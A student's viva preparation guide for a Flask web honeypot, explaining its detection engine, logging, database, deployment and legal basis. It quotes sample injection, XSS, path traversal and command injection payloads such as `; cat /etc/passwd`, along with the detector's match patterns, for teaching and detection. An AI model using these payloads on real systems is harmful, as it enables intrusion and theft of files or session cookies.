# 🎓 Web Honeypot — Minor Project Viva Preparation

---

## PART 1: GENERAL / CONCEPTUAL QUESTIONS

---

### Q1. What is a honeypot?
A honeypot is a security mechanism — a deliberately vulnerable system designed to attract attackers. It mimics real services (like websites, databases, or servers) so that attackers interact with it thinking it's a real target. The honeypot quietly logs all their activity for security analysis. It's a trap, essentially.

### Q2. What is the difference between a low-interaction and high-interaction honeypot?
- **Low-interaction honeypot** (what we built): Simulates only the surface-level behavior of services. It doesn't run real vulnerable software — it just *pretends* to. Safer to deploy, easier to maintain, but captures less detailed attacker behavior.
- **High-interaction honeypot**: Runs actual vulnerable software or full operating systems. Captures complete attacker behavior including exploitation techniques, but is risky — attackers could use it to pivot into your real network.

### Q3. Why did you build a web honeypot specifically?
Web applications are the most commonly attacked surface on the internet. By building a web honeypot, we can detect and study real-world web attack patterns like SQL Injection, XSS, and brute-force attacks. It's practical, relevant, and demonstrates core cybersecurity concepts.

### Q4. What are the real-world applications of honeypots?
- **Threat intelligence** — Understanding what attackers target and how.
- **Early warning systems** — Detecting attacks before they reach real systems.
- **Research** — Studying new attack techniques and malware.
- **Deception defense** — Wasting attacker time on fake systems.
- **Compliance** — Some organizations deploy them as part of security monitoring.

### Q5. Is this legal to deploy?
Yes, as long as it's on your own network/infrastructure. A honeypot is a *defensive* tool. You're not attacking anyone — you're observing attackers who voluntarily interact with your system. However, you should not deploy it on networks you don't own without permission.

### Q6. What is the difference between IDS, IPS, and a Honeypot?
- **IDS (Intrusion Detection System)**: Monitors network traffic and alerts when it detects malicious patterns. Passive — doesn't block.
- **IPS (Intrusion Prevention System)**: Like IDS but actively blocks malicious traffic.
- **Honeypot**: Doesn't monitor real traffic. It's a *decoy* that attracts attackers to study their behavior. Complementary to IDS/IPS.

### Q7. What is the OWASP Top 10?
OWASP Top 10 is a standard awareness document listing the 10 most critical web application security risks. Our honeypot detects several of them:
- **A03: Injection** → SQL Injection, Command Injection
- **A07: Cross-Site Scripting (XSS)** → XSS detection
- **A01: Broken Access Control** → LFI, Directory Traversal
- **A05: Security Misconfiguration** → Bot scanning for exposed config files

---

## PART 2: ATTACK-SPECIFIC QUESTIONS

---

### Q8. What is SQL Injection? How does your system detect it?
SQL Injection is when an attacker inserts SQL code into input fields to manipulate the database. For example, entering `admin' OR 1=1 --` as a username would bypass login if the backend naively concatenates user input into SQL queries.

**Our detection**: We use regex patterns in `detector.py` that match common SQL keywords and patterns like `UNION SELECT`, `OR 1=1`, `DROP TABLE`, `SLEEP()`, etc. The input is URL-decoded first so encoded payloads are also caught.

### Q9. What is XSS (Cross-Site Scripting)?
XSS is when an attacker injects malicious JavaScript into web pages viewed by other users. For example, `<script>alert(document.cookie)</script>` could steal session cookies.

**Types**:
- **Stored XSS** — Script is saved in the database and shown to other users.
- **Reflected XSS** — Script is reflected back in the server response (like in search results).
- **DOM-based XSS** — Script manipulates the page's DOM directly.

**Our detection**: We match patterns like `<script>`, `javascript:`, `onerror=`, `alert()`, `document.cookie`, etc.

### Q10. What is Local File Inclusion (LFI)?
LFI is when an attacker manipulates file path parameters to read files from the server. For example, `page?id=../../etc/passwd` tries to read the Linux password file by traversing up the directory tree.

**Our detection**: We match patterns like `../../`, `/etc/passwd`, `php://filter`, `boot.ini`, etc.

### Q11. What is the difference between LFI and Directory Traversal?
They're related but different:
- **LFI** — Exploits a file *inclusion* function to execute or read a file (e.g., PHP `include()`)
- **Directory Traversal** — Exploits file *download/access* functions to read arbitrary files (e.g., `download?file=../../../etc/passwd`)

In our system, both use `../` patterns, but LFI specifically checks for system files and PHP wrappers, while Directory Traversal focuses on path traversal sequences.

### Q12. What is Command Injection?
Command Injection is when an attacker injects OS commands through input fields. For example, if a server runs `ping <user_input>`, entering `; cat /etc/passwd` would execute that command after ping.

**Our detection**: We match patterns like `; ls`, `&& whoami`, `| cat`, backtick execution, and `$()` subshells.

### Q13. What is a brute-force attack? How do you detect it?
Brute force is when an attacker tries many username/password combinations rapidly to guess credentials. 

**Our detection**: We track login attempts per IP in memory using a dictionary with timestamps. If the same IP sends 5+ login requests within a 2-minute window, we classify it as brute force. This is done in the `_is_brute_force()` function in `detector.py`.

### Q14. What is bot scanning?
Bot scanning is automated probing of a web server for known vulnerable paths — like `/phpmyadmin`, `/wp-admin`, `/.env`, `/.git`. Bots try thousands of servers looking for unprotected admin panels or exposed configuration files.

**Our detection**: We maintain a list of commonly scanned paths and match incoming URLs against them.

---

## PART 3: CODE-SPECIFIC QUESTIONS

---

### Q15. Explain the architecture / flow of your system.
```
Attacker → HTTP Request → Flask Server (app.py)
  → before_request middleware extracts data (utils.py)
  → detector.py classifies the attack type
  → logger.py logs to file + database
  → routes.py returns a fake response
  → Dashboard (dashboard.py) displays analytics
```

Every single request goes through the `@app.before_request` middleware in `app.py` before reaching any route. This ensures nothing is missed.

### Q16. What does `@app.before_request` do in app.py?
`@app.before_request` is a Flask decorator that registers a function to run **before every HTTP request** is processed. We use it as middleware to:
1. Extract request data (IP, headers, payload, user agent)
2. Run the attack detection engine
3. Log the attack to both the log file and database

This is the core of the honeypot — it intercepts everything silently.

### Q17. Explain how `detector.py` works.
The detector uses **compiled regular expressions** (`re.compile()`) for each attack type. When a request comes in:
1. The URL and payload are combined into one string
2. This string is **URL-decoded** using `urllib.parse.unquote()` (so `%20OR` becomes ` OR`)
3. Each regex is checked in **priority order**: SQL Injection → XSS → Command Injection → LFI → RFI → Directory Traversal → File Upload → Bot Scan → Brute Force
4. The first match wins and returns the attack type
5. If nothing matches, it returns "Reconnaissance"

We compile regexes at module load time (`re.compile()`) rather than at each request for performance.

### Q18. Why do you use `re.compile()` instead of `re.search()` directly?
`re.compile()` pre-compiles the regex pattern into a pattern object. This is faster when the same pattern is used many times (which it is — every request), because the compilation step only happens once at import time rather than on every request.

### Q19. What is a Flask Blueprint? Why did you use them?
A Blueprint is Flask's way of organizing an application into modules. Instead of putting all routes in one file, we separate them:
- `honeypot` blueprint in `routes.py` — all trap endpoints
- `dashboard_bp` blueprint in `dashboard.py` — admin dashboard

This makes the code **modular**, **testable**, and **maintainable**. Each blueprint can have its own URL prefix (e.g., `/dashboard/`).

### Q20. Explain the database schema.
```sql
CREATE TABLE attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,  -- Unique ID
    timestamp TEXT,          -- When the attack happened (ISO format)
    ip_address TEXT,         -- Attacker's IP
    method TEXT,             -- HTTP method (GET/POST)
    url TEXT,                -- Full URL path with query params
    headers TEXT,            -- Request headers (JSON string)
    payload TEXT,            -- Combined query string + form data
    attack_type TEXT,        -- Classification result
    user_agent TEXT,         -- Browser/tool identifier
    file_uploaded TEXT,      -- Uploaded filename (if any)
    response_code INTEGER    -- HTTP status code returned
)
```
We also create **indexes** on `timestamp`, `ip_address`, and `attack_type` for fast dashboard queries.

### Q21. Why SQLite and not MySQL/PostgreSQL?
- **Zero configuration** — No server to install, it's a single file (`database.db`)
- **Built into Python** — No extra dependencies needed (`import sqlite3`)
- **Perfect for this use case** — A honeypot doesn't need high concurrency or massive scale
- **Portable** — The entire database is one file you can copy or email

For a production honeypot handling thousands of requests/second, you'd switch to PostgreSQL.

### Q22. What does `conn.row_factory = sqlite3.Row` do?
By default, SQLite returns tuples. Setting `row_factory = sqlite3.Row` makes it return Row objects that support access by **column name** (like `row['ip_address']`) instead of just index (like `row[2]`). This makes the code more readable and less error-prone.

### Q23. Explain the logging system (logger.py).
We use **dual logging** — every attack is recorded in two places:
1. **Log file** (`logs/honeypot.log`) — Human-readable text log using Python's built-in `logging` module. Useful for quick inspection with `tail -f`.
2. **SQLite database** — Structured data storage for querying, filtering, and dashboard analytics.

This redundancy ensures we never lose data — even if the database gets corrupted, the log file still has everything.

### Q24. What does `utils.py` → `extract_request_data()` do?
It pulls all relevant information from a Flask request object into a clean dictionary:
- **IP address** — From `X-Forwarded-For` header (for proxied requests) or `remote_addr`
- **Method** — GET, POST, etc.
- **URL** — Full path including query parameters
- **Headers** — All HTTP headers as a dictionary
- **Payload** — Combined from query string, form data, JSON body, or raw body
- **User Agent** — The browser/tool identifier
- **File uploaded** — Names of any uploaded files

### Q25. How does the file upload capture work?
In `file_capture.py`, when an attacker uploads a file:
1. The filename is sanitized using `werkzeug.secure_filename()` to prevent path traversal
2. A timestamp prefix is added (e.g., `20260322_235000_shell.php`)
3. The file is saved to the `uploads/` directory for forensic analysis
4. The original filename is checked against malicious extension patterns (`.php`, `.jsp`, `.exe`, etc.)

The file is **never executed** — just stored.

### Q26. Explain how the dashboard works.
The dashboard (`dashboard.py`) has 4 endpoints:
- `GET /dashboard/` — Renders the HTML page with server-side stats
- `GET /dashboard/api/stats` — Returns JSON aggregated stats (for Chart.js)
- `GET /dashboard/api/logs` — Returns paginated logs with filtering
- `GET /dashboard/download` — Exports all logs as CSV

The frontend uses **Chart.js** (loaded from CDN) to render 4 charts. On page load, JavaScript fetches `/dashboard/api/stats` and `/dashboard/api/logs` and renders them dynamically.

### Q27. Why do you URL-decode before detection?
When browsers and tools send special characters in URLs, they get percent-encoded. For example:
- `' OR 1=1` becomes `%27%20OR%201%3D1`
- `; ls` becomes `%3B%20ls`

If we don't decode first, our regex patterns won't match. `urllib.parse.unquote()` converts these back to their original characters before running detection.

### Q28. What is the `@app.errorhandler(404)` for?
It catches **all requests to non-existent pages**. This is crucial because bot scanners try hundreds of paths like `/phpmyadmin`, `/.git`, `/wp-login.php`. Without a 404 handler, Flask would return a default error page and we wouldn't log the attempt. With our handler, every single request — even to pages that don't exist — gets intercepted, classified, and logged.

---

## PART 4: TECHNOLOGY & DESIGN QUESTIONS

---

### Q29. Why Flask and not Django or Node.js?
- **Lightweight** — Flask is a microframework, perfect for a focused tool like a honeypot
- **Minimal boilerplate** — We don't need Django's ORM, admin panel, or authentication system
- **Full control** — Flask lets us intercept requests at a low level with `before_request`
- **Python ecosystem** — Easy access to regex, SQLite, logging, and data analysis libraries

### Q30. What is WSGI?
WSGI (Web Server Gateway Interface) is the Python standard for communication between web servers and web applications. Flask is a WSGI application. In production, you'd run it behind a WSGI server like **Gunicorn** rather than Flask's built-in development server.

### Q31. What security measures does the honeypot itself have?
- **No real functionality** — The fake pages don't execute queries, commands, or include files
- **File sanitization** — Uploaded files are sanitized with `secure_filename()` and never executed
- **HTML escaping** — Dashboard uses `html.escape()` to prevent stored XSS from attacker payloads
- **Upload size limit** — 16 MB max to prevent disk-filling attacks
- **Isolated storage** — Uploaded files go to a separate directory

### Q32. Can this honeypot be bypassed/detected by an attacker?
Yes, a skilled attacker might notice:
- The pages don't actually process anything (login always fails, search always returns the same results)
- There are no real session cookies or CSRF tokens
- The server fingerprint shows Flask
- All responses are very fast (no real database queries)

To improve: Add random delays, vary responses, use realistic cookies, and hide the Flask server signature.

### Q33. How would you deploy this in production?
1. Use **Gunicorn** as the WSGI server: `gunicorn -w 4 -b 0.0.0.0:80 app:app`
2. Put it behind **Nginx** as a reverse proxy
3. Run it in a **Docker container** for isolation
4. Use a separate VLAN/network segment
5. Set up **log forwarding** to a SIEM (Security Information and Event Management) system
6. Add **SSL/TLS** to make it look more realistic

---

## PART 5: POTENTIAL FOLLOW-UP / ADVANCED QUESTIONS

---

### Q34. What improvements would you make?
- **GeoIP lookup** — Map attacker IPs to countries using MaxMind GeoLite2
- **Email alerts** — Send notifications on high-severity attacks
- **IP blocking** — Auto-block IPs after repeated attacks using iptables
- **Machine learning** — Train a classifier on request features instead of regex
- **Multiple fake services** — Add fake FTP, SSH, and SMTP honeypots
- **Attack heatmap** — Visualize attack origins on a world map
- **REST API** — Expose logs via REST for integration with other security tools

### Q35. How would you add machine learning to this?
1. **Feature extraction**: Extract features from each request — URL length, number of special characters, presence of keywords, HTTP method, time of day, etc.
2. **Training data**: Use the logs we've already collected (labeled by regex classifier) as training data
3. **Model**: Train a classifier (Random Forest, SVM, or a neural network) on these features
4. **Inference**: Replace or supplement the regex detector with model predictions
5. **Benefit**: ML can catch novel/obfuscated attacks that regex misses

### Q36. What is the difference between signature-based and anomaly-based detection?
- **Signature-based** (what we use): Matches known attack patterns (regexes). Fast and accurate for known attacks, but misses novel/zero-day attacks.
- **Anomaly-based**: Learns what "normal" traffic looks like and flags deviations. Can detect unknown attacks, but has higher false-positive rates.

A production system would use both approaches together.

### Q37. How does the brute-force detection handle distributed attacks?
Currently, it tracks attempts **per IP**. If an attacker uses multiple IPs (distributed brute force), each IP would stay under the threshold. To counter this:
- Track by username being targeted (not just IP)
- Use rate limiting across all IPs for login endpoints
- Implement CAPTCHA-like challenges after N total failed logins

---

## PART 6: KEY CODE SECTIONS THEY MAY ASK ABOUT

---

### "Show me where the attack detection happens"
→ `detector.py`, the `detect_attack()` function (line ~111). Walk through the priority chain.

### "Show me how logging works"
→ `logger.py`, the `log_request()` function. Explain dual logging.

### "How does the middleware work?"
→ `app.py`, the `@app.before_request` decorator and `analyze_request()` function.

### "Show me the database operations"
→ `database.py`, especially `init_db()` for schema and `get_stats()` for dashboard aggregations.

### "How do you handle file uploads safely?"
→ `file_capture.py`, the `capture_upload()` function. Mention `secure_filename()` and timestamp prefixing.

### "How does the dashboard render charts?"
→ `templates/dashboard.html`, the `<script>` section at the bottom. Explain the `fetch()` to `/dashboard/api/stats` and Chart.js initialization.

### "What happens to a request from start to finish?"
→ Walk through: `app.py before_request` → `utils.extract_request_data()` → `detector.detect_attack()` → `logger.log_request()` → route handler in `routes.py` → HTML response.

---

> **Tip**: When presenting, open the dashboard in a browser, run a few curl attacks live, and refresh the dashboard to show the attacks appearing in real-time. This is very impressive in a demo.

---

## PART 7: MID-REVIEW SPECIFIC QUESTIONS

---

### Q38. The project is at 60-65% completion. What have you accomplished so far?
We have successfully built the core honeypot infrastructure:
1. **Proxy Capture Middleware** — Reliably intercepting and extracting client requests.
2. **Regex Classification Engine** — Validating and categorizing over 10 web attack vectors.
3. **Dual Logging Mechanism** — Simultaneously logging to SQLite and flat text files without dropping requests.
4. **Admin Dashboard** — Fully functional UI with Chart.js visualization.
5. **Dataset Integration Scripts** — Framework for importing expanding signature sets.

### Q39. What exactly is left to do for the remaining 35-40%?
- **Advanced Threat Mapping** — Sessionizing IP addresses to track multi-stage attacks over time instead of just single payloads.
- **GeoIP Integration** — Translating attacker IP addresses to physical locations for heatmap rendering.
- **Active OS Blocking** — Wiring the honeypot up to `fail2ban` or `iptables` to actively drop malicious connections.
- **Real-time Notifications** — Email/Webhook alerts for critical payloads (like rootkits or reverse shells).
- **Public Sandbox Deployment** — Pushing the code to a live cloud server to gather real-world internet noise.

---

## PART 8: NEW DATASET & ARCHITECTURE INTEGRATION

---

### Q40. Why did you integrate the OWASP Core Rule Set (CRS) and PayloadsAllTheThings?
In our initial build, our regex engine only caught fundamental attacks. By integrating standardized datasets like OWASP CRS and PayloadsAllTheThings, we vastly expanded our signature dictionary to catch highly obfuscated, zero-day, and complex n-day variations of attacks. It moved our honeypot from a "basic theoretical trap" to a "production-grade threat intelligence sensor."

### Q41. How does the dataset statistics module work?
It is a dedicated module that parses our imported JSON datasets and calculates the weight, frequency, and severity distributions of the attack vectors we've ingested. This helps us algorithmically determine which regex patterns should be prioritized first in `detector.py` to optimize CPU cycles and minimize lag.

---

## PART 9: LIVE DEMO & "RUN THE CODE" SCENARIO QUESTIONS

---

If the panel asks you to run the honeypot live, be prepared to open two terminal windows. In Terminal 1, run `python app.py`. In Terminal 2, run a quick `curl` attack.

### Q42. "Can you show me where this attack was just logged in the code?"
*(When asked this during a live demo)*
**Answer:** "Certainly. The attack we just ran was intercepted by the `@app.before_request` middleware in `app.py`. It immediately passed the payload to `detector.py`, which identified it. If we look at the flat file by typing `tail -n 10 logs/honeypot.log`, we can see the plaintext entry right here. Simultaneously, if we open the dashboard at `http://localhost:5000/dashboard/`, you can see the new formatted row added to the SQLite database dynamically."

### Q43. "Stop the server. If I send a payload like `/?search=<script>alert(1)</script>`, precisely which line of code evaluates this first?"
**Answer:** "In `app.py`, the very first function that triggers is `analyze_request()` which is decorated with `@app.before_request`. Inside that function, it calls `utils.extract_request_data()`, which is where the `?search=` parameter is explicitly extracted via Flask's `request.args` before any normal routing occurs."

### Q44. "Run the `test_attacks.sh` script for us. How does the honeypot keep up with this speed?"
**Answer:** "The script sends multiple requests concurrently. The honeypot easily handles this because our intensive regex patterns in `detector.py` are all pre-compiled using `re.compile()` when the server first boots up. We aren't recompiling complex strings on every single request, which saves massive amounts of CPU overhead."

### Q45. "Show me the database file. Can I open it directly without the dashboard?"
**Answer:** "Yes, the database is entirely self-contained in `database.db`. Since it utilizes SQLite3, we can open it right here in the terminal by typing `sqlite3 database.db` and running a query like `SELECT * FROM attacks ORDER BY id DESC LIMIT 5;` to verify the live data we just generated."

---

## PART 10: DEEP THEORETICAL CYBERSECURITY & THREAT MODELING

---

### Q46. How does your honeypot integrate into the broader MITRE ATT&CK framework?
**Answer:** "The MITRE ATT&CK framework categorizes attacker tactics and techniques. Our honeypot primarily addresses the 'Reconnaissance' (TA0043) and 'Initial Access' (TA0001) tactics. By capturing raw HTTP probes and exploit payloads, we map to specific techniques like T1190 (Exploit Public-Facing Application) and T1595 (Active Scanning)."

### Q47. Define the concept of a 'Cyber Kill Chain' and explain where your system interrupts it.
**Answer:** "The Cyber Kill Chain, originally developed by Lockheed Martin, models the stages of a cyberattack: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control (C2), and Actions on Objectives. Our honeypot intercepts the attack at the **Delivery and Exploitation phases**. The attacker delivers their weaponized payload (e.g., a reverse shell script via file upload or a SQL injection via a query string), but because our environment is a simulation, the Exploitation phase technically succeeds from their perspective but fundamentally fails in reality since there is no actual system to compromise or install upon."

### Q48. What is 'Zero-Trust Architecture', and how does a honeypot fit into it?
**Answer:** "Zero-Trust is a security model that assumes threats exist both inside and outside the network, enforcing strict verification for every user and device ('Never trust, always verify'). A honeypot acts as a definitive zero-trust sensor. Because *zero legitimate users* should ever access a honeypot, any connection attempt—whether from an external IP or an internal compromised machine—is automatically considered a verified, high-confidence threat lacking authorization."

### Q49. What is the difference between an n-day and a zero-day vulnerability, and how does your system handle them?
**Answer:** "A zero-day is a vulnerability completely unknown to the vendor, meaning no patch exists. An n-day is a known vulnerability that the vendor has patched, but many systems remain unpatched over time. Our signature-based regex engine is incredibly strong against n-days (since we ingest known OWASP rules). However, unless a zero-day utilizes a fundamentally recognizable syntax (like a sudden influx of backticks or base64 encoded PHP tags), our signature engine might classify it generically. This is exactly why we plan to implement anomaly-based Machine Learning models in the future to catch structural anomalies associated with zero-days."

---

## PART 11: DATABASE & STORAGE ENGINE INTERNALS

---

### Q50. You chose SQLite. Explain the concept of ACID compliance and if SQLite supports it.
**Answer:** "ACID stands for Atomicity, Consistency, Isolation, and Durability—guarantees that database transactions are processed reliably. Yes, SQLite is completely ACID-compliant. This means if our honeypot experiences a sudden power loss or kernel panic precisely while writing a complex multi-megabyte log of a massive attack payload, the database file will not become corrupted. The transaction simply rolls back, ensuring the database remains completely consistent."

### Q51. What data structure does SQLite use to index our attacks, and why did you index the `timestamp` and `ip_address`?
**Answer:** "SQLite uses B-Trees (Balanced Trees) for indexing data. By creating `CREATE INDEX idx_ip ON attacks(ip_address)`, SQLite constructs a B-Tree referencing the memory locations of rows associated with specific IPs. When our dashboard queries for the 'Top 5 Attacking IP Addresses', SQLite rapidly traverses this logarithmic tree in O(log N) time instead of performing an O(N) full-table scan, accelerating dashboard load times from seconds to single-digit milliseconds even with millions of logged attacks."

### Q52. If 50 automated bots attack the honeypot simultaneously, how does SQLite handle concurrent writes?
**Answer:** "By default, SQLite uses a file-locking mechanism that can lead to 'database is locked' errors during extreme concurrency. To mitigate this in a production honeypot, we can enable WAL (Write-Ahead Logging) mode via `PRAGMA journal_mode=WAL;`. In WAL mode, SQLite appends writes to a separate log file rather than blocking the main database, allowing multiple concurrent reads and writes exponentially more efficiently."

---

## PART 12: PYTHON WSGI, FLASK, & NETWORKING STACK

---

### Q53. Explain the OSI Model and pinpoint exactly where Flask, HTTP, and your Middleware operate.
**Answer:** "The OSI Model has 7 layers. 
- **Layer 3 (Network) & Layer 4 (Transport):** Handled by the host OS (Linux kernel) receiving IP packets via TCP segments.
- **Layer 7 (Application):** HTTP lives here. The WSGI server (like Werkzeug or Gunicorn) receives these HTTP byte streams, parses the headers, and translates them into Python dictionary objects.
- **Flask Middleware:** Operates within Layer 7, essentially acting as custom application logic that intercepts the decoded Python dictionary representation of the HTTP request before the Flask routing engine passes it to a view function."

### Q54. What is the difference between multi-threading, multi-processing, and asynchronous I/O in the context of handling attacks?
**Answer:** "Currently, Flask's built-in development server handles requests using basic threading—it spawns a new thread for each incoming attack. However, because of Python's Global Interpreter Lock (GIL), multi-threading doesn't allow true parallel CPU execution. In production with Gunicorn, we would use multi-processing (spawning entirely separate Python processes) or asynchronous workers (like Eventlet or Gevent) which allow the server to quickly switch contexts while waiting for the SQLite database to slowly write to disk, vastly increasing our ability to handle massive Distributed Denial of Service (DDoS) traffic."

### Q55. How do you ensure the honeypot logs the TRUE IP address of an attacker, rather than a proxy or Cloudflare IP?
**Answer:** "If the honeypot is placed behind a Reverse Proxy (like Nginx, AWS ALBs, or Cloudflare), the `request.remote_addr` variable will simply show the proxy's internal IP. In `utils.py`, our extraction function aggressively checks the `X-Forwarded-For` and `X-Real-IP` HTTP headers. These headers are injected by the proxy, containing the attacker's original, true origin IP address which we then log."

---

## PART 13: ADVANCED REGULAR EXPRESSION THEORY

---

### Q56. How does a Regular Expression Engine actually work under the hood in Python?
**Answer:** "Python uses a Non-deterministic Finite Automaton (NFA) regex engine. When we compile our attack signatures, the engine generates an internal state machine. As it reads the attacker's specific payload character by character, it transitions between acceptable states. If it hits a dead end (a mismatch), it 'backtracks' to the last known good state and tries an alternate path."

### Q57. What is 'Catastrophic Backtracking', and how could an attacker use it against your honeypot?
**Answer:** "Catastrophic Backtracking occurs when a poorly written, highly recursive regular expression (like `(a+)+$`) processes an intentionally crafted string that almost matches but ultimately fails. The NFA engine will attempt millions of permutations, causing the CPU to spike to 100% and locking up a server thread. This represents a Regular Expression Denial of Service (ReDoS) vulnerability. To defend against this, we ensure all our ingested OWASP and PayloadsAllTheThings regex patterns are explicitly bounded, non-greedy, and strictly tested to avoid infinite recursive group loops."

### Q58. Explain the exact regex logic behind catching a directory traversal attack.
**Answer:** "We use variations of `re.compile(r'(\.\.+[/\\]+)+', re.IGNORECASE)`. 
1. `\.\.` strictly matches two literal periods (`..`).
2. `+` means one or more occurrences.
3. `[/\\]` matches either a forward slash (Linux) or backslash (Windows).
4. `+` means one or more slashes.
This universally catches `../../`, `..//..//`, `..\\..\\`, identifying OS-agnostic attempts to traverse out of the web root."

---

## PART 14: LEGAL, ETHICAL, & COMPLIANCE DEEP DIVE

---

### Q59. What is the explicit legal difference between 'Entrapment' and 'Enticement'?
**Answer:** "This is a critical legal consideration in defensive security.
- **Entrapment** (Illegal for law enforcement): Inducing, coercing, or tricking someone into committing a crime they otherwise had no intention of committing. 
- **Enticement** (Legal): Placing attractive, vulnerable-looking assets (the honeypot) in an accessible location and merely observing what voluntarily happens. 
Our honeypot relies strictly on logical enticement. We do not solicit attacks; attackers voluntarily initiate the malicious HTTP connection to our exposed IP address, making our passive logging completely legally sound."

### Q60. If you capture an attack originating from Europe containing personal data in the payload, how does the GDPR apply?
**Answer:** "The General Data Protection Regulation (GDPR) protects Personally Identifiable Information (PII) of EU citizens. IP addresses are legally considered PII under GDPR. Because we are collecting attacker IP addresses without their consent, we technically fall under the 'Legitimate Interest' lawful basis for processing (Article 6(1)(f)), which permits processing necessary for network and information security. However, to remain strictly compliant, we should implement a data retention policy (e.g., automatically purging logs older than 90 days)."

### Q61. How does your system comply with ISO/IEC 27001 standards?
**Answer:** "ISO 27001 dictates the establishment of an Information Security Management System (ISMS). Our honeypot acts as a technical control fulfilling Annex A controls regarding 'Protection against malware,' 'Information security event reporting,' and 'Collection of evidence.' By maintaining a read-only architectural profile and dual-logging with immutable timestamping, we provide strict, auditable forensic evidence supporting compliance mandates."

---

## PART 15: THE "WHAT IF" EDGE-CASE SCENARIOS

---

### Q62. What if an attacker sends an encrypted, obfuscated HTTPS payload using an unknown cipher suite?
**Answer:** "Because the SSL/TLS termination happens either at our reverse proxy (Nginx) or within the Python WSGI layer itself, the payload arrives at our Flask middleware completely decrypted in plaintext HTTP format. Once decrypted, we URL-decode it. The cipher suite used during extreme transport is irrelevant to our layer 7 classification engine."

### Q63. What if an attacker uses IPv6 instead of IPv4? Will the database schema break?
**Answer:** "No. Our database schema deliberately stores `ip_address` as a `TEXT` BLOB natively in SQLite rather than an integer or 32-bit specific format. An IPv6 address (like `2001:0db8:85a3:0000:0000:8a2e:0370:7334`) is simply parsed as a 39-character string. The regex string-matching algorithms, brute-force state tracking dictionary keys, and chart aggregations handle IPv6 natively without any structural breakdown."

### Q64. What if an attacker attempts an HTTP Slowloris attack to exhaust your honeypot's connection pool?
**Answer:** "A Slowloris attack involves sending partial HTTP headers extremely slowly to tie up server threads. Because our Flask development server uses generic threading, a sustained Slowloris attack would paralyze it. This is exactly why development servers are never used in production. By deploying our app behind a robust reverse proxy like Nginx—which buffers the entire HTTP request asynchronously before passing it to the WSGI socket—Slowloris attacks are mitigated at the edge before our honeypot even sees them."

### Q65. What if an attacker uploads a massive 5GB file to cause a Disk Exhaustion (Denial of Service) attack?
**Answer:** "In `app.py`, we must enforce `app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024` (16 Megabytes). This is a built-in Flask configuration that relies on Werkzeug to immediately severe the TCP connection if the `Content-Length` header or the streaming HTTP body payload exceeds 16MB. This completely negates volume-based file upload exhaustion attacks."

### Q66. What if the malware payload is polymorphic, constantly changing its structural signature?
**Answer:** "Polymorphic malware dynamically alters its identifiable file hashes or string signatures to evade basic antivirus matching. Unfortunately, pure static string-based honeypots struggle against true polymorphism. However, while the *payload body* may be polymorphic, the *delivery mechanism* (e.g., the URL parameter injecting the payload, like `?cmd=wget...`) usually adheres to rigid, static syntax dependencies that our regex engine easily intercepts."

---

## PART 16: ADVANCED DATA VISUALIZATION & FRONTEND THEORY

---

### Q67. How does Chart.js asynchronously update without requiring a full page refresh?
**Answer:** "The dashboard employs the modern JavaScript `fetch()` API. When the dashboard page (`/dashboard/`) initially loads, it presents an empty DOM layout. Immediately upon rendering, the client's browser asynchronously executes `fetch('/dashboard/api/stats')`. The honeypot's internal Flask API returns pure JSON containing aggregated attack data. Our custom JavaScript then parses this JSON, maps the values into arrays, and dynamically invokes Chart.js methods (`new Chart()`) to render the interactive SVGs/Canvas graphics natively on the client's GPU, drastically saving server rendering overhead."

### Q68. Explain the specific difference between your temporal charts (time-based) and spatial charts (distribution).
**Answer:** "Our spatial charts (like specifically the Pie Chart) plot categorical distribution—for example, showing that SQL Injection represents 45% of total volume, XSS represents 25%, etc., offering an aggregate macro-view. Our temporal charts (like the Line Graph tracing attacks over the last 24 hours) plot sequential time-series vector data, visualizing exactly *when* spikes occur, which is fundamentally critical for identifying coordinated, automated botnet surges during specific geographical time zones."

---

## PART 17: PENETRATION TESTING PERSPECTIVES

---

### Q69. If you were a penetration tester engaged to attack your own honeypot, what bypass techniques would you attempt?
**Answer:** "I would immediately attempt advanced payload fragmentation. For example, instead of sending a recognizable `<script>alert(1)</script>`, I would send heavily mangled, multi-stage concatenated payloads like `<scri` + `pt>` evaluating via `eval(String.fromCharCode(...))`. I would also attempt HTTP Parameter Pollution (sending multiple `?id=1` parameters) to see if the Python dictionary only logs the final parameter while ignoring an exploit hidden in the first parameter."

### Q70. How would you detect that this system is a honeypot if you were an attacker?
**Answer:** "Determined attackers utilize 'fingerprinting.' They would notice that every single simulated page returns extremely fast (because there is no actual database processing the simulated queries). They might notice identical `Server: Werkzeug/Python` HTTP headers across different seemingly disparate services. They would also observe that simulated vulnerabilities (like an exposed admin panel) accept credentials but never logically proceed to a genuinely authenticated state, regardless of the payloads provided. Finally, the honeypot lacks organic variables—like dynamic cookies tracking genuine user sessions—revealing it as a static decoy."

---

## PART 18: SECURE CODING PRACTICES & FLASK INTERNALS

---

### Q71. If a developer isn't using a honeypot, how do they prevent SQL Injection in their real Flask applications?
**Answer:** "The absolute best defense against SQL Injection is the use of Parameterized Queries (Prepared Statements) or an Object-Relational Mapper (ORM) like SQLAlchemy. When using `cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))`, the SQLite engine explicitly treats the `user_input` strictly as a string literal data binding, rather than executable SQL logic, completely neutralizing SQLi payloads natively before execution."

### Q72. Explain how Jinja2 mitigates Cross-Site Scripting (XSS).
**Answer:** "Jinja2 is the default templating engine for Flask. By default, it employs Autoescaping. This means if an attacker manages to get a payload like `<script>alert('XSS')</script>` stored into the database, when Jinja2 renders that variable onto an HTML page, it automatically converts the angle brackets into HTML entities (`&lt;script&gt;`). The browser therefore renders the payload as harmless visible text on the screen rather than executing it as a DOM script."

### Q73. What is CSRF (Cross-Site Request Forgery) and how does our honeypot theoretically simulate it?
**Answer:** "CSRF tricks an authenticated user's browser into executing unwanted actions on a web application where they are currently authenticated. To mitigate this in the real world, developers use non-predictable CSRF tokens embedded in hidden form fields. Our honeypot simulates vulnerability to this by deliberately ignoring the validation of any token fields across POST state-changing requests, allowing automated scanners to believe they have found an unauthenticated, insecure endpoint."

---

## PART 19: MODERN DEPLOYMENT & CONTAINERIZATION

---

### Q74. How does encapsulating the honeypot inside a Docker container improve security?
**Answer:** "Docker provides OS-level virtualization. By running the honeypot inside a Docker container, we isolate its execution lifecycle, file system, and memory space from the host operating system using Linux Namespaces and Control Groups (cgroups). This acts as a critical sandbox barrier; even if an attacker discovers a zero-day Remote Code Execution (RCE) flaw in Python or Flask itself, they only compromise the isolated container—which we can instantly destroy and rebuild—rather than the actual host server."

